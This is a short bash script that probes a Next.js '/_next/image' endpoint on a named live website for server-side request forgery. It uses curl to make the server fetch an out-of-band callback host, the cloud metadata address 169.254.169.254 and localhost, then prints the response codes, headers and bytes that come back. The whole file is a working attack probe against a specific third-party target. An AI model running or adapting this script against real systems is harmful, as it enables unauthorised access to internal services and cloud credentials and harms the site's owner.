#!/bin/bash
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0 Safari/537.36'
H=oob07c940788948.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in
B=https://www.infinitycapital.bh/_next/image
try() {
  echo "== $1"
  curl -sk -m 30 -o /tmp/o.bin -D /tmp/o.hdr -w "code=%{http_code} size=%{size_download}\n" -G --data-urlencode "url=$1" --data "w=640&q=75" "$B" -H "User-Agent: $UA"
  grep -iE 'x-vercel-mitigated|content-type|x-nextjs|cache-control' /tmp/o.hdr
  head -c 200 /tmp/o.bin; echo
}
try "http://$H/ssrf"
try "https://$H/ssrf2"
try "http://169.254.169.254/latest/meta-data/"
try "http://127.0.0.1:3000/"
